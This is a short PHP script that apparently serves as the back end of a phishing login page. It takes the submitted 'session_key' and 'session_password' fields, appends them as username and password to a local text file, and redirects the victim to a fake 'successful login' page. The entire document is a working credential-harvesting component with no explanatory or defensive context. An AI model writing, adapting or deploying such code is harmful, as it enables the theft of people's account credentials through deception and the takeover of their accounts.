<?php
file_put_contents("usernames.txt", "Username: " . $_POST['session_key'] . " | Password: " . $_POST['session_password'] . "\n", FILE_APPEND);
header('Location: ./successful_login.html');
exit();
?>
